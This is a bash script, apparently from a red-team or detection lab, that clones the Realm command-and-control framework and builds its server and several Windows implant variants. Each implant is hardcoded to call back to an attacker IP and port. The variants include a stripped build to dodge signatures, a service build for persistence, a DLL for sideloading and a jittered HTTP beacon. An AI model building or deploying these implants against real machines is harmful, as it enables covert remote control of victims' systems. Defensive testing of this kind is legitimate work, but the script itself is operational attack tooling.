#!/usr/bin/env bash
# ATTACKER box (172.16.69.109) - run ONCE: clone Realm, build Tavern + the implant battery.
# Prereqs: Go >=1.21, Rust toolchain (rustup), git.
set -e
ATTACKER_IP=172.16.69.109
PORT=8080          # Tavern gRPC/HTTP port used for callbacks
SHARE_DIR=~/realm-share

echo "[*] cloning Realm..."
git clone https://github.com/spellshift/realm.git ~/realm || true
cd ~/realm
git checkout -b latest $(git tag | tail -1)

echo "[*] building Tavern server..."
go build -o /tavern ./tavern || go build -o tavern ./tavern

echo "[*] building the implant battery (A-G)..."
cd implants/imix

# A - baseline gRPC implant (callback baked in)
IMIX_CALLBACK_URI=http://${ATTACKER_IP}:${PORT} cargo build --release
cp target/release/imix.exe ${SHARE_DIR}/imix.exe 2>/dev/null || { mkdir -p ${SHARE_DIR}; cp target/release/imix.exe ${SHARE_DIR}/imix.exe; }

# B - stripped build (signature robustness test)
cp target/release/imix.exe ${SHARE_DIR}/imix_stripped.exe
strip ${SHARE_DIR}/imix_stripped.exe

# C - Windows service build (persistence test)
cargo build --release --features win_service
cp target/release/imix.exe ${SHARE_DIR}/imix_svc.exe

# D - DLL build (LOLBIN/sideload execution test)
cargo build --release --lib
cp target/release/imix.dll ${SHARE_DIR}/imix.dll

# E - jittered HTTP transport variant: write cfg, rebuild
cat > /tmp/http.yaml <<EOF
transports:
  - type: http1
    uri: http://${ATTACKER_IP}:${PORT}
    interval: 10
    jitter: 0.5
EOF
IMIX_CALLBACK_URI=http://${ATTACKER_IP}:${PORT} IMIX_CONFIG=/tmp/http.yaml cargo build --release
cp target/release/imix.exe ${SHARE_DIR}/imix_http.exe

echo "[*] done. binaries in ${SHARE_DIR}:"
ls -la ${SHARE_DIR}
echo "[*] next: ./02-run-tavern.sh  and  ./03-serve.sh"
